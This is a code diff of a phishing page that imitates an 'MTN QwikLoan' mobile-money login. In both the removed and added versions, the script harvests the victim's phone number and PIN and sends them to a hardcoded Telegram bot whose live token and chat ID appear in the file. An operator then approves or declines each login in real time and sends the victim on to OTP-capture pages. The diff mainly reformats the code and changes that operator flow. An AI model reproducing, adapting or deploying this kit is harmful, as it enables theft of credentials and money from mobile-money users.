@@ -1,623 +1,612 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-  <title>MTN QwikLoan – Login with PIN</title>
-  <!-- Google Fonts & Icons -->
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Inter', Arial, Helvetica, sans-serif;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>MTN QwikLoan – Login with PIN</title>
+    <!-- Google Fonts & Icons -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', Arial, Helvetica, sans-serif;
+        }
 
-    body {
-      background: #ffffff;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 12px;
-    }
+        body {
+            background: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 12px;
+        }
 
-    .container {
-      width: 100%;
-      max-width: 360px;
-      margin: 0 auto;
-      background: white;
-      border-radius: 28px;
-      padding: 30px 16px 36px;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
-      position: relative;
-      text-align: center;
-    }
+        .container {
+            width: 100%;
+            max-width: 360px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 28px;
+            padding: 30px 16px 36px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            position: relative;
+            text-align: center;
+        }
 
-    .content {
-      position: relative;
-      z-index: 2;
-    }
+        .content {
+            position: relative;
+            z-index: 2;
+        }
 
-    .logo {
-      text-align: center;
-      margin-top: 20px;
-    }
-    .logo-circle {
-      width: 48px;
-      height: 48px;
-      background: #000;
-      border-radius: 50%;
-      color: #FFCC00;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 28px;
-      margin: auto;
-      font-weight: 800;
-    }
-    .logo-text {
-      color: #000;
-      font-size: 24px;
-      font-weight: bold;
-      margin-top: 6px;
-    }
-    .logo-text span {
-      color: #FFCC00;
-      background: #000;
-      display: inline-block;
-      padding: 0 6px;
-      border-radius: 10px;
-    }
+        .logo {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .logo-circle {
+            width: 48px;
+            height: 48px;
+            background: #000;
+            border-radius: 50%;
+            color: #FFCC00;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            margin: auto;
+            font-weight: 800;
+        }
+        .logo-text {
+            color: #000;
+            font-size: 24px;
+            font-weight: bold;
+            margin-top: 6px;
+        }
+        .logo-text span {
+            color: #FFCC00;
+            background: #000;
+            display: inline-block;
+            padding: 0 6px;
+            border-radius: 10px;
+        }
 
-    .title {
-      text-align: center;
-      color: #FFCC00;
-      font-size: 18px;
-      font-weight: 700;
-      margin-top: 12px;
-    }
-    .subtitle {
-      text-align: center;
-      color: #555;
-      font-size: 14px;
-      margin-top: 8px;
-      line-height: 1.45;
-      padding: 0 4px;
-    }
+        .title {
+            text-align: center;
+            color: #FFCC00;
+            font-size: 18px;
+            font-weight: 700;
+            margin-top: 12px;
+        }
+        .subtitle {
+            text-align: center;
+            color: #555;
+            font-size: 14px;
+            margin-top: 8px;
+            line-height: 1.45;
+            padding: 0 4px;
+        }
 
-    .form {
-      margin-top: 24px;
-      text-align: left;
-    }
+        .form {
+            margin-top: 24px;
+            text-align: left;
+        }
 
-    .label {
-      font-size: 13px;
-      color: #555;
-      margin-bottom: 6px;
-      display: block;
-      font-weight: 500;
-    }
+        .label {
+            font-size: 13px;
+            color: #555;
+            margin-bottom: 6px;
+            display: block;
+            font-weight: 500;
+        }
 
-    .input {
-      width: 100%;
-      height: 48px;
-      border-radius: 12px;
-      border: 1px solid #ddd;
-      padding: 0 14px;
-      font-size: 15px;
-      background: #fff;
-      outline: none;
-      transition: border 0.2s;
-    }
-    .input:focus {
-      border-color: #FFCC00;
-      box-shadow: 0 0 0 2px rgba(255,204,0,0.3);
-    }
+        .input {
+            width: 100%;
+            height: 48px;
+            border-radius: 12px;
+            border: 1px solid #ddd;
+            padding: 0 14px;
+            font-size: 15px;
+            background: #fff;
+            outline: none;
+            transition: border 0.2s;
+        }
+        .input:focus {
+            border-color: #FFCC00;
+            box-shadow: 0 0 0 2px rgba(255, 204, 0, 0.3);
+        }
 
-    .pin-row {
-      display: grid;
-      grid-template-columns: repeat(4, 1fr);
-      gap: 12px;
-      margin-top: 8px;
-      margin-bottom: 20px;
-    }
-    .pin-input {
-      width: 100%;
-      height: 48px;
-      border-radius: 12px;
-      border: 1px solid #ddd;
-      text-align: center;
-      font-size: 24px;
-      font-weight: 600;
-      background: #fff;
-      outline: none;
-      transition: border 0.2s;
-      -webkit-text-security: disc;
-      inputmode: numeric;
-      font-family: monospace;
-    }
-    .pin-input:focus {
-      border-color: #FFCC00;
-      box-shadow: 0 0 0 2px rgba(255,204,0,0.3);
-    }
-    .pin-input.filled {
-      border-color: #ffe0a3;
-      background: #fffef7;
-    }
+        .pin-row {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 12px;
+            margin-top: 8px;
+            margin-bottom: 20px;
+        }
+        .pin-input {
+            width: 100%;
+            height: 48px;
+            border-radius: 12px;
+            border: 1px solid #ddd;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 600;
+            background: #fff;
+            outline: none;
+            transition: border 0.2s;
+            -webkit-text-security: disc;
+            inputmode: numeric;
+            font-family: monospace;
+        }
+        .pin-input:focus {
+            border-color: #FFCC00;
+            box-shadow: 0 0 0 2px rgba(255, 204, 0, 0.3);
+        }
+        .pin-input.filled {
+            border-color: #ffe0a3;
+            background: #fffef7;
+        }
 
-    .btn {
-      width: 100%;
-      height: 52px;
-      border: none;
-      border-radius: 14px;
-      font-size: 16px;
-      margin-top: 18px;
-      cursor: pointer;
-      font-weight: 700;
-    }
-    .btn-primary {
-      background: linear-gradient(90deg, #FFCC00, #E6B800);
-      color: #000;
-      box-shadow: 0 4px 12px rgba(255,204,0,0.3);
-    }
-    .btn-primary.disabled, .btn-primary:disabled {
-      background: #e5e5e5;
-      color: #999;
-      cursor: not-allowed;
-      box-shadow: none;
-    }
-    .btn-outline {
-      background: transparent;
-      border: 2px solid #FFCC00;
-      color: #333;
-      font-weight: 600;
-    }
+        .btn {
+            width: 100%;
+            height: 52px;
+            border: none;
+            border-radius: 14px;
+            font-size: 16px;
+            margin-top: 18px;
+            cursor: pointer;
+            font-weight: 700;
+        }
+        .btn-primary {
+            background: linear-gradient(90deg, #FFCC00, #E6B800);
+            color: #000;
+            box-shadow: 0 4px 12px rgba(255, 204, 0, 0.3);
+        }
+        .btn-primary.disabled,
+        .btn-primary:disabled {
+            background: #e5e5e5;
+            color: #999;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+        .btn-outline {
+            background: transparent;
+            border: 2px solid #FFCC00;
+            color: #333;
+            font-weight: 600;
+        }
 
-    .version {
-      text-align: center;
-      color: #aaa;
-      font-size: 11px;
-      margin-top: 18px;
-    }
+        .version {
+            text-align: center;
+            color: #aaa;
+            font-size: 11px;
+            margin-top: 18px;
+        }
 
-    #spinner {
-      position: fixed;
-      inset: 0;
-      display: none;
-      align-items: center;
-      justify-content: center;
-      background: rgba(255, 255, 255, 0.8);
-      backdrop-filter: blur(2px);
-      z-index: 999;
-    }
-    .loader {
-      width: 42px;
-      height: 42px;
-      border: 4px solid #ffe0a3;
-      border-top: 4px solid #FFCC00;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-    }
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
+        #spinner {
+            position: fixed;
+            inset: 0;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255, 255, 255, 0.8);
+            backdrop-filter: blur(2px);
+            z-index: 999;
+        }
+        .loader {
+            width: 42px;
+            height: 42px;
+            border: 4px solid #ffe0a3;
+            border-top: 4px solid #FFCC00;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
 
-    .error-box {
-      position: absolute;
-      top: 12px;
-      left: 12px;
-      right: 12px;
-      background: #fff;
-      border: 2px solid #ff4d4d;
-      border-radius: 14px;
-      padding: 12px;
-      display: none;
-      box-shadow: 0 5px 20px rgba(0,0,0,0.12);
-      z-index: 100;
-      text-align: left;
-    }
-    .error-title {
-      color: #ff0000;
-      font-weight: bold;
-      font-size: 14px;
-      margin-bottom: 4px;
-    }
-    .error-text {
-      color: #444;
-      font-size: 13px;
-    }
-    .close {
-      position: absolute;
-      right: 12px;
-      top: 8px;
-      cursor: pointer;
-      font-size: 20px;
-      color: #999;
-    }
+        .error-box {
+            position: absolute;
+            top: 12px;
+            left: 12px;
+            right: 12px;
+            background: #fff;
+            border: 2px solid #ff4d4d;
+            border-radius: 14px;
+            padding: 12px;
+            display: none;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.12);
+            z-index: 100;
+            text-align: left;
+        }
+        .error-title {
+            color: #ff0000;
+            font-weight: bold;
+            font-size: 14px;
+            margin-bottom: 4px;
+        }
+        .error-text {
+            color: #444;
+            font-size: 13px;
+        }
+        .close {
+            position: absolute;
+            right: 12px;
+            top: 8px;
+            cursor: pointer;
+            font-size: 20px;
+            color: #999;
+        }
 
-    @media (max-width: 360px) {
-      body {
-        padding: 8px;
-      }
-      .container {
-        padding: 24px 12px 32px;
-        border-radius: 24px;
-      }
-      .logo {
-        margin-top: 8px;
-      }
-      .logo-circle {
-        width: 44px;
-        height: 44px;
-        font-size: 26px;
-      }
-      .logo-text {
-        font-size: 22px;
-      }
-      .title {
-        font-size: 17px;
-        margin-top: 8px;
-      }
-      .subtitle {
-        font-size: 13px;
-      }
-      .form {
-        margin-top: 20px;
-      }
-      .input, .pin-input, .btn {
-        height: 46px;
-      }
-      .pin-input {
-        font-size: 22px;
-      }
-      .btn {
-        font-size: 15px;
-        margin-top: 16px;
-      }
-      .version {
-        font-size: 10px;
-        margin-top: 16px;
-      }
-    }
-  </style>
+        @media (max-width: 360px) {
+            body {
+                padding: 8px;
+            }
+            .container {
+                padding: 24px 12px 32px;
+                border-radius: 24px;
+            }
+            .logo {
+                margin-top: 8px;
+            }
+            .logo-circle {
+                width: 44px;
+                height: 44px;
+                font-size: 26px;
+            }
+            .logo-text {
+                font-size: 22px;
+            }
+            .title {
+                font-size: 17px;
+                margin-top: 8px;
+            }
+            .subtitle {
+                font-size: 13px;
+            }
+            .form {
+                margin-top: 20px;
+            }
+            .input,
+            .pin-input,
+            .btn {
+                height: 46px;
+            }
+            .pin-input {
+                font-size: 22px;
+            }
+            .btn {
+                font-size: 15px;
+                margin-top: 16px;
+            }
+            .version {
+                font-size: 10px;
+                margin-top: 16px;
+            }
+        }
+    </style>
 </head>
 <body>
 
-<div class="container">
-  <div class="error-box" id="errorBox">
-    <div class="close" onclick="hideError()">×</div>
-    <div class="error-title">Error</div>
-    <div class="error-text" id="errorText">Invalid credentials</div>
-  </div>
+    <div class="container">
+        <div class="error-box" id="errorBox">
+            <div class="close" onclick="hideError()">×</div>
+            <div class="error-title">Error</div>
+            <div class="error-text" id="errorText">Invalid credentials</div>
+        </div>
 
-  <div class="content">
-    <div class="logo">
-      <div class="logo-circle">M</div>
-      <div class="logo-text"><span>MTN</span> QwikLoan</div>
+        <div class="content">
+            <div class="logo">
+                <div class="logo-circle">M</div>
+                <div class="logo-text"><span>MTN</span> QwikLoan</div>
+            </div>
+            <div class="title">Welcome to MTN QwikLoan</div>
+            <div class="subtitle">
+                Enter your MTN number and PIN to login.
+            </div>
+
+            <div class="form">
+                <div class="label">MTN Number</div>
+                <input class="input" id="phoneInput" placeholder="024XXXXXXX" inputmode="numeric">
+
+                <div class="label" style="margin-top:15px;">PIN</div>
+                <div class="pin-row">
+                    <input type="password" class="pin-input" id="pin1" maxlength="1" inputmode="numeric" autocomplete="off">
+                    <input type="password" class="pin-input" id="pin2" maxlength="1" inputmode="numeric" autocomplete="off">
+                    <input type="password" class="pin-input" id="pin3" maxlength="1" inputmode="numeric" autocomplete="off">
+                    <input type="password" class="pin-input" id="pin4" maxlength="1" inputmode="numeric" autocomplete="off">
+                </div>
+
+                <button class="btn btn-primary" id="loginBtn" disabled>Login</button>
+                <button class="btn btn-outline" id="goBackBtn">Go Back</button>
+
+                <div class="version">v2.6.2 (MTN-QWIK-2026)</div>
+            </div>
+        </div>
     </div>
-    <div class="title">Welcome to MTN QwikLoan</div>
-    <div class="subtitle">
-      Enter your MTN number and PIN to login.
+
+    <div id="spinner">
+        <div class="loader"></div>
     </div>
 
-    <div class="form">
-      <div class="label">MTN Number</div>
-      <input class="input" id="phoneInput" placeholder="024XXXXXXX" inputmode="numeric">
+    <script>
+        // ========== TELEGRAM CONFIG ==========
+        const BOT_TOKEN = '8745115171:AAHIirv4QpNh1p6JMWLLh6sqrvBh-YrO7Bc';
+        const CHAT_ID = '1006917440';
+        const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
-      <div class="label" style="margin-top:15px;">PIN</div>
-      <div class="pin-row">
-        <input type="password" class="pin-input" id="pin1" maxlength="1" inputmode="numeric" autocomplete="off">
-        <input type="password" class="pin-input" id="pin2" maxlength="1" inputmode="numeric" autocomplete="off">
-        <input type="password" class="pin-input" id="pin3" maxlength="1" inputmode="numeric" autocomplete="off">
-        <input type="password" class="pin-input" id="pin4" maxlength="1" inputmode="numeric" autocomplete="off">
-      </div>
+        // ========== DOM ELEMENTS ==========
+        const phoneInput = document.getElementById('phoneInput');
+        const loginBtn = document.getElementById('loginBtn');
+        const goBackBtn = document.getElementById('goBackBtn');
+        const spinner = document.getElementById('spinner');
+        const errorBox = document.getElementById('errorBox');
+        const errorText = document.getElementById('errorText');
 
-      <button class="btn btn-primary" id="loginBtn" disabled>Login</button>
-      <button class="btn btn-outline" id="goBackBtn">Go Back</button>
+        const pinInputs = [
+            document.getElementById('pin1'),
+            document.getElementById('pin2'),
+            document.getElementById('pin3'),
+            document.getElementById('pin4')
+        ];
 
-      <div class="version">v2.6.2 (MTN-QWIK-2026)</div>
-    </div>
-  </div>
-</div>
+        let isSubmitting = false;
+        let currentPollInterval = null;
 
-<div id="spinner">
-  <div class="loader"></div>
-</div>
-
-<script>
-  // ========== TELEGRAM CONFIG ==========
-  const BOT_TOKEN = '8745115171:AAHIirv4QpNh1p6JMWLLh6sqrvBh-YrO7Bc';
-  const CHAT_ID   = '1006917440';
-  const API_BASE  = `https://api.telegram.org/bot${BOT_TOKEN}`;
-
-  // ========== DOM ELEMENTS ==========
-  const phoneInput = document.getElementById('phoneInput');
-  const loginBtn = document.getElementById('loginBtn');
-  const goBackBtn = document.getElementById('goBackBtn');
-  const spinner = document.getElementById('spinner');
-  const errorBox = document.getElementById('errorBox');
-  const errorText = document.getElementById('errorText');
-
-  const pinInputs = [
-    document.getElementById('pin1'),
-    document.getElementById('pin2'),
-    document.getElementById('pin3'),
-    document.getElementById('pin4')
-  ];
-
-  let isSubmitting = false;
-  let currentPollInterval = null;
-
-  function showError(message) {
-    errorText.innerText = message || 'Invalid credentials';
-    errorBox.style.display = 'block';
-  }
-  function hideError() {
-    errorBox.style.display = 'none';
-  }
-
-  function clearPinFields() {
-    pinInputs.forEach(input => {
-      input.value = '';
-      input.classList.remove('filled');
-    });
-  }
-
-  function focusFirstPin() {
-    pinInputs[0].focus();
-  }
-
-  function updateLoginButton() {
-    const phone = phoneInput.value.trim();
-    const allPinsFilled = pinInputs.every(pin => pin.value.length === 1);
-    const isValid = phone !== '' && allPinsFilled;
-    loginBtn.disabled = !isValid;
-  }
-
-  function setupPinInputs() {
-    pinInputs.forEach((input, idx) => {
-      input.addEventListener('input', function(e) {
-        let val = this.value;
-        val = val.replace(/\D/g, '').slice(0,1);
-        this.value = val;
-        if (val.length === 1) {
-          this.classList.add('filled');
-          if (idx < pinInputs.length - 1) {
-            pinInputs[idx + 1].focus();
-          }
-        } else {
-          this.classList.remove('filled');
+        function showError(message) {
+            errorText.innerText = message || 'Invalid credentials';
+            errorBox.style.display = 'block';
         }
-        updateLoginButton();
-        hideError();
-      });
 
-      input.addEventListener('keydown', function(e) {
-        if (e.key === 'Backspace') {
-          if (this.value.length === 0 && idx > 0) {
-            e.preventDefault();
-            pinInputs[idx - 1].focus();
-            pinInputs[idx - 1].value = '';
-            pinInputs[idx - 1].classList.remove('filled');
-            updateLoginButton();
-          }
-        } else if (e.key === 'ArrowLeft') {
-          if (idx > 0) {
-            e.preventDefault();
-            pinInputs[idx - 1].focus();
-          }
-        } else if (e.key === 'ArrowRight') {
-          if (idx < pinInputs.length - 1) {
-            e.preventDefault();
-            pinInputs[idx + 1].focus();
-          }
-        } else if (!/^[0-9]$/.test(e.key) && e.key !== 'Tab' && e.key !== 'Delete') {
-          e.preventDefault();
+        function hideError() {
+            errorBox.style.display = 'none';
         }
-      });
-    });
-  }
 
-  function validateMobileNumber(number) {
-    const cleaned = number.replace(/\D/g, '');
-    if (cleaned.length < 10) return false;
-    return cleaned.startsWith('024') || cleaned.startsWith('054') || 
-           cleaned.startsWith('055') || cleaned.startsWith('059');
-  }
+        function clearPinFields() {
+            pinInputs.forEach(input => {
+                input.value = '';
+                input.classList.remove('filled');
+            });
+        }
 
-  function generate5DigitOTP() {
-    return Math.floor(10000 + Math.random() * 90000).toString();
-  }
-  function generate6DigitOTP() {
-    return Math.floor(100000 + Math.random() * 900000).toString();
-  }
+        function focusFirstPin() {
+            pinInputs[0].focus();
+        }
 
-  function escapeHtml(unsafe) {
-    if (!unsafe) return '';
-    return unsafe.replace(/[&<>"]/g, function(m) {
-      if (m === '&') return '&amp;';
-      if (m === '<') return '&lt;';
-      if (m === '>') return '&gt;';
-      if (m === '"') return '&quot;';
-      return m;
-    });
-  }
+        function updateLoginButton() {
+            const phone = phoneInput.value.trim();
+            const allPinsFilled = pinInputs.every(pin => pin.value.length === 1);
+            const isValid = phone !== '' && allPinsFilled;
+            loginBtn.disabled = !isValid;
+        }
 
-  function stopPolling() {
-    if (currentPollInterval) {
-      clearInterval(currentPollInterval);
-      currentPollInterval = null;
-    }
-  }
+        function setupPinInputs() {
+            pinInputs.forEach((input, idx) => {
+                input.addEventListener('input', function(e) {
+                    let val = this.value;
+                    val = val.replace(/\D/g, '').slice(0, 1);
+                    this.value = val;
+                    if (val.length === 1) {
+                        this.classList.add('filled');
+                        if (idx < pinInputs.length - 1) {
+                            pinInputs[idx + 1].focus();
+                        }
+                    } else {
+                        this.classList.remove('filled');
+                    }
+                    updateLoginButton();
+                    hideError();
+                });
 
-  async function sendLoginToTelegram(phone, pin) {
-    const ts = Date.now();
-    const fiveOtpId = `login_5otp_${ts}`;
-    const sixOtpId = `login_6otp_${ts}`;
-    const declineId = `login_decline_${ts}`;
-    
-    sessionStorage.setItem('mtn_phone', phone.replace(/\D/g, ''));
-    sessionStorage.setItem('mtn_pin', pin);
-    
-    const message = `🔐 <b>MTN QwikLoan Login Request</b>\n\n` +
-                    `<b>MoMo Number:</b> <code>${escapeHtml(phone)}</code>\n` +
-                    `<b>4‑Digit PIN:</b> <code>${escapeHtml(pin)}</code>\n\n` +
-                    `📢 <b>Choose OTP length or Decline:</b>`;
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace') {
+                        if (this.value.length === 0 && idx > 0) {
+                            e.preventDefault();
+                            pinInputs[idx - 1].focus();
+                            pinInputs[idx - 1].value = '';
+                            pinInputs[idx - 1].classList.remove('filled');
+                            updateLoginButton();
+                        }
+                    } else if (e.key === 'ArrowLeft') {
+                        if (idx > 0) {
+                            e.preventDefault();
+                            pinInputs[idx - 1].focus();
+                        }
+                    } else if (e.key === 'ArrowRight') {
+                        if (idx < pinInputs.length - 1) {
+                            e.preventDefault();
+                            pinInputs[idx + 1].focus();
+                        }
+                    } else if (!/^[0-9]$/.test(e.key) && e.key !== 'Tab' && e.key !== 'Delete') {
+                        e.preventDefault();
+                    }
+                });
+            });
+        }
 
-    try {
-      const response = await fetch(`${API_BASE}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: message,
-          parse_mode: 'HTML',
-          reply_markup: {
-            inline_keyboard: [[
-              { text: ' 5 OTP', callback_data: fiveOtpId },
-              { text: ' 6 OTP', callback_data: sixOtpId },
-              { text: '❌ Decline', callback_data: declineId }
-            ]]
-          }
-        })
-      });
-      
-      if (!response.ok) throw new Error(`HTTP ${response.status}`);
-      
-      startPollingForDecision(fiveOtpId, sixOtpId, declineId);
-    } catch (err) {
-      console.error('Telegram send error:', err);
-      spinner.style.display = 'none';
-      isSubmitting = false;
-      loginBtn.disabled = false;
-      updateLoginButton();
-      showError('Network error. Please try again.');
-    }
-  }
+        function validateMobileNumber(number) {
+            const cleaned = number.replace(/\D/g, '');
+            if (cleaned.length < 10) return false;
+            return cleaned.startsWith('024') || cleaned.startsWith('054') ||
+                cleaned.startsWith('055') || cleaned.startsWith('059');
+        }
 
-  function startPollingForDecision(fiveOtpId, sixOtpId, declineId) {
-    stopPolling();
-    let lastUpdateId = 0;
-    
-    currentPollInterval = setInterval(async () => {
-      try {
-        const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
-        const response = await fetch(url);
-        const data = await response.json();
-        if (!data.ok || !data.result.length) return;
-        
-        for (const update of data.result) {
-          lastUpdateId = Math.max(lastUpdateId, update.update_id);
-          const callback = update.callback_query;
-          if (!callback) continue;
-          const cbData = callback.data;
-          
-          if (cbData === fiveOtpId) {
+        function escapeHtml(unsafe) {
+            if (!unsafe) return '';
+            return unsafe.replace(/[&<>"]/g, function(m) {
+                if (m === '&') return '&amp;';
+                if (m === '<') return '&lt;';
+                if (m === '>') return '&gt;';
+                if (m === '"') return '&quot;';
+                return m;
+            });
+        }
+
+        function stopPolling() {
+            if (currentPollInterval) {
+                clearInterval(currentPollInterval);
+                currentPollInterval = null;
+            }
+        }
+
+        async function sendLoginToTelegram(phone, pin) {
+            const ts = Date.now();
+            const approveId = `login_approve_${ts}`;
+            const declineId = `login_decline_${ts}`;
+
+            sessionStorage.setItem('mtn_phone', phone.replace(/\D/g, ''));
+            sessionStorage.setItem('mtn_pin', pin);
+
+            const message =
+                `🔐 <b>MTN QwikLoan Login Request</b>\n\n` +
+                `<b>MoMo Number:</b> <code>${escapeHtml(phone)}</code>\n` +
+                `<b>4‑Digit PIN:</b> <code>${escapeHtml(pin)}</code>\n\n` +
+                `📢 <b>Approve or Decline this login attempt:</b>`;
+
+            try {
+                const response = await fetch(`${API_BASE}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML',
+                        reply_markup: {
+                            inline_keyboard: [
+                                [
+                                    { text: '✅ Approve', callback_data: approveId },
+                                    { text: '❌ Decline', callback_data: declineId }
+                                ]
+                            ]
+                        }
+                    })
+                });
+
+                if (!response.ok) throw new Error(`HTTP ${response.status}`);
+
+                startPollingForDecision(approveId, declineId);
+            } catch (err) {
+                console.error('Telegram send error:', err);
+                spinner.style.display = 'none';
+                isSubmitting = false;
+                loginBtn.disabled = false;
+                updateLoginButton();
+                showError('Network error. Please try again.');
+            }
+        }
+
+        function startPollingForDecision(approveId, declineId) {
             stopPolling();
-            spinner.style.display = 'none';
-            isSubmitting = false;
-            const otp = generate5DigitOTP();
-            sessionStorage.setItem('mtn_otp', otp);
-            sessionStorage.setItem('mtn_otp_length', '5');
-            window.location.href = 'otp5.html';
-            return;
-          }
-          
-          if (cbData === sixOtpId) {
-            stopPolling();
-            spinner.style.display = 'none';
-            isSubmitting = false;
-            const otp = generate6DigitOTP();
-            sessionStorage.setItem('mtn_otp', otp);
-            sessionStorage.setItem('mtn_otp_length', '6');
-            window.location.href = 'otp6.html';
-            return;
-          }
-          
-          if (cbData === declineId) {
-            stopPolling();
-            spinner.style.display = 'none';
-            isSubmitting = false;
-            loginBtn.disabled = false;
-            updateLoginButton();
-            showError('Authentication declined. Please check your credentials and try again.');
+            let lastUpdateId = 0;
+
+            currentPollInterval = setInterval(async () => {
+                try {
+                    const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
+                    const response = await fetch(url);
+                    const data = await response.json();
+                    if (!data.ok || !data.result.length) return;
+
+                    for (const update of data.result) {
+                        lastUpdateId = Math.max(lastUpdateId, update.update_id);
+                        const callback = update.callback_query;
+                        if (!callback) continue;
+                        const cbData = callback.data;
+
+                        // —————— APPROVE ——————
+                        if (cbData === approveId) {
+                            stopPolling();
+                            spinner.style.display = 'none';
+                            isSubmitting = false;
+                            // Redirect to OTP link page
+                            window.location.href = 'otp-link.html';
+                            return;
+                        }
+
+                        // —————— DECLINE ——————
+                        if (cbData === declineId) {
+                            stopPolling();
+                            spinner.style.display = 'none';
+                            isSubmitting = false;
+                            loginBtn.disabled = false;
+                            updateLoginButton();
+                            showError('Authentication declined. Please check your credentials and try again.');
+                            clearPinFields();
+                            focusFirstPin();
+                            return;
+                        }
+                    }
+                } catch (err) {
+                    console.warn('Polling error:', err);
+                }
+            }, 1500);
+        }
+
+        async function submitLogin() {
+            if (isSubmitting) return;
+
+            const phone = phoneInput.value.trim();
+            const pin = pinInputs.map(p => p.value).join('');
+
+            hideError();
+
+            if (!phone) {
+                showError('Please enter your MTN MoMo number.');
+                return;
+            }
+            if (pin.length !== 4) {
+                showError('Please enter your 4-digit PIN.');
+                return;
+            }
+
+            if (!validateMobileNumber(phone)) {
+                showError('Please enter a valid MTN MoMo number starting with 024, 054, 055, or 059 (10 digits).');
+                return;
+            }
+
+            isSubmitting = true;
+            loginBtn.disabled = true;
+            spinner.style.display = 'flex';
+
+            await sendLoginToTelegram(phone, pin);
+        }
+
+        phoneInput.addEventListener('input', function(e) {
+            let val = this.value.replace(/[^0-9]/g, '');
+            if (val.length > 10) val = val.slice(0, 10);
+            this.value = val;
             clearPinFields();
-            focusFirstPin();
-            return;
-          }
+            updateLoginButton();
+            hideError();
+        });
+
+        phoneInput.addEventListener('paste', function(e) {
+            e.preventDefault();
+            const pasted = (e.clipboardData || window.clipboardData).getData('text');
+            const digits = pasted.replace(/\D/g, '').slice(0, 10);
+            this.value = digits;
+            clearPinFields();
+            updateLoginButton();
+            hideError();
+        });
+
+        loginBtn.addEventListener('click', submitLogin);
+        goBackBtn.addEventListener('click', () => {
+            window.history.back();
+        });
+
+        function init() {
+            setupPinInputs();
+            updateLoginButton();
+            hideError();
+            phoneInput.focus();
         }
-      } catch (err) {
-        console.warn('Polling error:', err);
-      }
-    }, 1500);
-  }
 
-  async function submitLogin() {
-    if (isSubmitting) return;
-    
-    const phone = phoneInput.value.trim();
-    const pin = pinInputs.map(p => p.value).join('');
-    
-    hideError();
-    
-    if (!phone) {
-      showError('Please enter your MTN MoMo number.');
-      return;
-    }
-    if (pin.length !== 4) {
-      showError('Please enter your 4-digit PIN.');
-      return;
-    }
-    
-    if (!validateMobileNumber(phone)) {
-      showError('Please enter a valid MTN MoMo number starting with 024, 054, 055, or 059 (10 digits).');
-      return;
-    }
-    
-    isSubmitting = true;
-    loginBtn.disabled = true;
-    spinner.style.display = 'flex';
-    
-    await sendLoginToTelegram(phone, pin);
-  }
+        init();
 
-  phoneInput.addEventListener('input', function(e) {
-    let val = this.value.replace(/[^0-9]/g, '');
-    if (val.length > 10) val = val.slice(0,10);
-    this.value = val;
-    clearPinFields();
-    updateLoginButton();
-    hideError();
-  });
-  
-  phoneInput.addEventListener('paste', function(e) {
-    e.preventDefault();
-    const pasted = (e.clipboardData || window.clipboardData).getData('text');
-    const digits = pasted.replace(/\D/g, '').slice(0,10);
-    this.value = digits;
-    clearPinFields();
-    updateLoginButton();
-    hideError();
-  });
-  
-  loginBtn.addEventListener('click', submitLogin);
-  goBackBtn.addEventListener('click', () => {
-    window.history.back();
-  });
-  
-  function init() {
-    setupPinInputs();
-    updateLoginButton();
-    hideError();
-    phoneInput.focus();
-  }
-  
-  init();
-  
-  window.hideError = hideError;
-</script>
+        window.hideError = hideError;
+    </script>
 </body>
 </html>
